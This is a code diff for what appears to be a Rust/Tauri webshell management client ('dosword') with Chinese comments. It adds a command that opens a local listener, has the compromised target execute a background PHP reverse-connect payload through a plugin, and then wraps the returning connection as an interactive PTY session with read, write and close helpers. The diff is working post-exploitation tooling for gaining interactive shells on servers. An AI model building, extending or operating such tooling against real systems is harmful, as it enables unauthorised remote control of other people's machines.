@@ -11,6 +11,7 @@ use dosword_sdk::domain::{
     ShellProfile, UpdateShell, UpdateWorkspace, Workspace,
 };
 use dosword_sdk::encoder::{EncoderRegistry, STUB_LANGUAGES};
+use dosword_sdk::plugin::FeaturePlugin;
 use dosword_sdk::{PluginManifest, Protocol, ProtocolError, SessionState};
 
 use crate::auth;
@@ -1064,6 +1065,108 @@ pub async fn connect_shell(shell_id: String, app: AppHandle) -> Result<ConnectRe
     .await
 }
 
+/// 建立交互式 PTY 会话：目标反弹回连后返回 ptyId（失败则报错，前端降级为命令模式）。
+#[tauri::command]
+pub async fn start_pty_session(session_id: String, app: AppHandle) -> Result<serde_json::Value, String> {
+    blocking(app, move |state| {
+        let ctx = session_ctx(state, &session_id)?;
+        let (session, _) = {
+            let sessions = state.sessions.lock().map_err(|_| "会话锁异常".to_string())?;
+            let shell = sessions
+                .get(&session_id)
+                .ok_or_else(|| "会话不存在或已过期，请重新连接".to_string())?;
+            (shell.state.clone(), ())
+        };
+        // 1) 本地监听随机端口
+        let listener = std::net::TcpListener::bind("127.0.0.1:0")
+            .map_err(|error| format!("PTY 监听绑定失败：{error}"))?;
+        listener
+            .set_nonblocking(true)
+            .map_err(|error| format!("PTY 监听设置失败：{error}"))?;
+        let port = listener
+            .local_addr()
+            .map_err(|error| format!("PTY 监听地址获取失败：{error}"))?
+            .port();
+        // 2) 目标执行 PTY 反弹载荷（后台模式）
+        let protocol = state
+            .protocols
+            .get(&ctx.shell.protocol_id)
+            .ok_or_else(|| format!("未知协议：{}", ctx.shell.protocol_id))?;
+        let out = <dosword_sdk::feature_plugins::SuperTerminalPlugin as FeaturePlugin>::execute(
+            &dosword_sdk::feature_plugins::SuperTerminalPlugin,
+            protocol,
+            session.as_ref(),
+            "php",
+            &serde_json::json!({"host": "127.0.0.1", "port": port, "background": true}),
+            &ctx.settings,
+        )
+        .map_err(|error| format!("PTY 反弹载荷执行失败：{error}"))?;
+        if out.get("ok").and_then(|v| v.as_bool()) != Some(true) {
+            return Err(format!(
+                "PTY 反弹未启动：{}",
+                out.get("error").and_then(|v| v.as_str()).unwrap_or("未知错误")
+            ));
+        }
+        // 3) 等待目标回连（最长 12 秒）
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(12);
+        loop {
+            match listener.accept() {
+                Ok((stream, _)) => {
+                    let pty_id = state.ptys.insert(stream);
+                    return Ok(serde_json::json!({ "ptyId": pty_id, "port": port }));
+                }
+                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
+                    if std::time::Instant::now() > deadline {
+                        return Err("PTY 会话建立超时（目标未回连，可能缺少可执行命令通道）".to_string());
+                    }
+                    std::thread::sleep(std::time::Duration::from_millis(120));
+                }
+                Err(error) => return Err(format!("PTY 接受连接失败：{error}")),
+            }
+        }
+    })
+    .await
+}
+
+/// 向 PTY 会话写入数据（base64）。
+#[tauri::command]
+pub async fn pty_write(pty_id: String, data_b64: String, app: AppHandle) -> Result<(), String> {
+    blocking(app, move |state| {
+        let bytes = base64::engine::general_purpose::STANDARD
+            .decode(data_b64)
+            .map_err(|error| format!("PTY 输入解码失败：{error}"))?;
+        state.ptys.write(&pty_id, &bytes)
+    })
+    .await
+}
+
+/// 非阻塞读取 PTY 输出（base64）。
+#[tauri::command]
+pub async fn pty_read(pty_id: String, app: AppHandle) -> Result<serde_json::Value, String> {
+    blocking(app, move |state| match state.ptys.read(&pty_id) {
+        Ok(bytes) => Ok(serde_json::json!({
+            "data": base64::engine::general_purpose::STANDARD.encode(bytes),
+            "closed": false,
+        })),
+        Err(error) => Ok(serde_json::json!({
+            "data": "",
+            "closed": true,
+            "error": error,
+        })),
+    })
+    .await
+}
+
+/// 关闭 PTY 会话。
+#[tauri::command]
+pub async fn pty_close(pty_id: String, app: AppHandle) -> Result<(), String> {
+    blocking(app, move |state| {
+        state.ptys.close(&pty_id);
+        Ok(())
+    })
+    .await
+}
+
 /// 读取活跃会话缓存的环境信息（供详情页从列表进入时补全连接信息）。
 #[tauri::command]
 pub async fn get_session_probe(session_id: String, app: AppHandle) -> Result<ProbeResult, String> {
@@ -1562,6 +1665,7 @@ mod tests {
             sessions: Mutex::new(SessionManager::new()),
             protocols: ProtocolRegistry::builtin(),
             feature_plugins: std::sync::Mutex::new(dosword_sdk::FeaturePluginRegistry::builtin()),
+            ptys: crate::pty::PtyRegistry::new(),
         }
     }
 
